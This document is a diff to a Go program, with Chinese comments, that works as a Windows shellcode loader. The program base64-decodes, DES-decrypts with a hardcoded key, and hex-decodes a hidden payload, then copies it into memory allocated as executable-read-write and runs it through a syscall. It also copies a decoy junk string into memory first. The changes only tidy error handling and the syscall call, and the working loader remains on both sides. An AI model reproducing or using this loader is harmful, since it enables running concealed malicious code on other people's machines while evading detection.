@@ -32,13 +32,13 @@ func main() {
 	var c string = "sgamfygyjffqrqwxzcvzxbsdwdqbsdbgagqwQWRQW/.OAUSHCNIADOdjfqwSFADOQIWOIJOGWEMPOSDPOOPasffvaSFAsafwfYRinJD3124651612qwrE02e"
 
 	// 调用VirtualAllo申请一块内存
-	addr1, _, err := VirtualAlloc.Call(0, uintptr(len(c)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	addr1, _, _ := VirtualAlloc.Call(0, uintptr(len(c)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	//调用RtlCopyMemory加载进内存当中
-	_, _, err = RtlCopyMemory.Call(addr1, (uintptr)(unsafe.Pointer(&c)), uintptr(len(c)/2))
+	_, _, _ = RtlCopyMemory.Call(addr1, (uintptr)(unsafe.Pointer(&c)), uintptr(len(c)/2))
 
 	Str := Readcode()                                                              // 加载 code
 	deStrBytes := DecrptogDES([]byte(Base64DecodeString(Str)), []byte("fu9527ck")) // 必须8位保持一致
-	code, err := hex.DecodeString(string(deStrBytes))
+	code, _ := hex.DecodeString(string(deStrBytes))
 
 	// 调用VirtualAllo申请一块内存
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
@@ -47,12 +47,12 @@ func main() {
 	}
 
 	// 调用RtlCopyMemory加载进内存当中
-	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)/2))
+	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)/2))
 	_, _, err = RtlCopyMemory.Call(addr+uintptr(len(code)/2), (uintptr)(unsafe.Pointer(&code[len(code)/2])), uintptr(len(code)/2))
 	checkErr(err)
 
 	//syscall来运行code
-	syscall.Syscall(addr, 0, 0, 0, 0)
+	syscall.SyscallN(addr, 0, 0, 0, 0)
 }
 
 func checkErr(err error) {
